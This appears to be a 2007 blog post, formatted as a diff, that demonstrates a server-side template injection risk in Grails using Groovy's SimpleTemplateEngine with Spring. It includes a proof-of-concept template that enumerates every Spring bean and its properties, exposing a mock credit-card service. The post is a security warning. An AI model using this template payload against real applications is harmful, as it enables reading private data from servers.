@@ -1,0 +1,151 @@
+= Grails, Spring and templates security issue example
+Cédric Champeau
+2007-08-02
+:jbake-type: post
+:jbake-tags: grails, groovy, security, spring
+:jbake-status: published
+:source-highlighter: prettify
+
+In my http://www.jroller.com/melix/entry/replacing_velocity_with_groovy_jsmarty[previous post], I was thinking about using Groovy SimpleTemplateEngine as a replacement for Velocity. The main idea was to be able to create arbitrary functions for use in the template without having to rebuild my application (and expose a utility class). I’ve been told about taking a look at http://freemarker.org[_FreeMarker_], but the problem is quite the same : some operations may not be written by a web designer. I’ll take a simple example : for a customer, we needed to be able to take a simple string, and convert it in an URL encoded string. To do that, I had to expose and utility tool which was able to do URL encoding, and rebuild and application. As far as I have seen, FreeMarker functions do not allow that kind of manipulation either (I _may_ be wrong, feel free to correct me).
+
+[[]]
+Security issue
+--------------
+
+However, the goal of this post is to show you why mixing code with templates is generally a bad idea, however powerful the technique may be. As best example, I’ll show you a major security issue with using both _Spring_ and _Groovy._ I’ve chosen Spring because most of my applications use this framework, and I’m quite confident yours too.
+
+First, we’ll write a simple service, which should never be exposed to the end user. Its goal is to retrieve my list of credit card numbers, in order to be able to choose which one I’ll use to buy my PS3 system. +
+
+[source]
+----
+package com.example;
+
+public class MyPrivateService {
+    private String[] theCreditCardNumbers;
+
+    public String[] getCreditCardNumbers() {
+        return theCreditCardNumbers;
+    }
+
+    public void setCreditCardNumbers(String[] someCreditCardNumbers) {
+        theCreditCardNumbers = someCreditCardNumbers;
+    }
+}
+
+----
+
+
+And the following Spring configuration :
+
+[source]
+----
+        
+  
+ 
+        
+
+----
+
+
+Here’s a sample Groovy script that shows you how this could be used in your application :
+
+[source]
+----
+import org.springframework.beans.factory.BeanFactory
+import org.springframework.beans.factory.xml.XmlBeanFactory
+import org.springframework.core.io.ClassPathResource
+
+
+// setup Spring Application Context
+def beanfactory = new XmlBeanFactory(new ClassPathResource("com/example/applicationContext.xml"))
+
+// print credit card numbers
+def creditCardService = beanfactory.getBean("creditCardService")
+
+creditCardService.creditCardNumbers.each {
+ println it;
+}
+
+----
+
+
+which outputs :
+
+[source]
+----
+1114-554112-01115
+1151-45454-454490
+
+----
+
+
+Imagine my service is for pure internal usage, and that it must NEVER EVER be exposed to the public. However, in some other part of your web application, there’s a front end page which may be customized (themed) thanks to the Groovy template engine. This allows the customer to create his own theme, granted he writes a good looking HTML page. The user could write something as simple as :
+
+[source]
+----
+Hello, M. ${user.name} !
+
+----
+
+
+You may think that your system is secure, because you only exposed the _User_ bean to your template :
+
+[source]
+----
+import groovy.text.SimpleTemplateEngine
+
+class ProofOfConceptController {
+
+ def index = {
+  def template = '''
+   <%  def content = new StringBuffer();
+    def beanfactory = new org.springframework.beans.factory.xml.XmlBeanFactory(
+     new org.springframework.core.io.FileSystemResource("spring/resources.xml"))
+    beanfactory.beanDefinitionNames.each {
+     content << "Bean named $it defined in application context";
+     content << ""
+     def bean = beanfactory.getBean(it)
+     bean.properties.each {
+      content << "$it"
+     }
+     content << ""
+    }
+   %>
+            $content
+  ''';
+  def binding = ["user" : "cedric"]
+  def engine = new SimpleTemplateEngine()
+  ["rendered" : engine.createTemplate(template).make(binding)]
+ }
+}
+
+----
+
+
+Here’s the output :
+
+[source]
+----
+Bean named creditCardService defined in application context
+
+    * metaClass=org.codehaus.groovy.grails.commons.metaclass.ExpandoMetaClass@ea7776[class com.example.CreditCardService]
+    * transactional=true
+    * creditCardNumbers=[Ljava.lang.String;@4e94a4
+    * class=class com.example.CreditCardService
+
+----
+
+
+Using this Grails controller, the user will be able to browse all beans defined within the traditional ``resources.xml'' Grails file !
+
+[[]]
+How does it work ?
+------------------
+
+This proof-of-concept assumes that the user knowns about the underlying technology : Grails. Using this, you can grab the user defined application context (resources.xml) in order to list all beans. With the previous template, the hacker could find out interesting beans and properties. Now he should just adapt the template to read the _creditCardService_ property named _creditCardNumbers_… Well, I must admit this is rather tricky : the hacker has to know about the Grails internals, but sure this example could be adapted to other web applications. Spring provides a useful but risky class called _WebApplicationContextUtils_ which allows, given a session, retrieving the application context. Therefore if the session (that’s the tough part) is avaible *to the template*, one could hack the system. Fortunately, it is unlikely that the programmer makes the session available to the template, and we must encourage not to do so.
+
+[[]]
+Conclusion
+----------
+
+I’ve just showed you how one could use Groovy templates in order to hack a system or steal information. The problem resides in the mixed environment where the hacker has access to the same static utility methods as the programmer, in the same JVM. Therefore, if you cannot isolate the template engine from the rest of the system (I wonder how it could be done), you must really be careful about what you do…
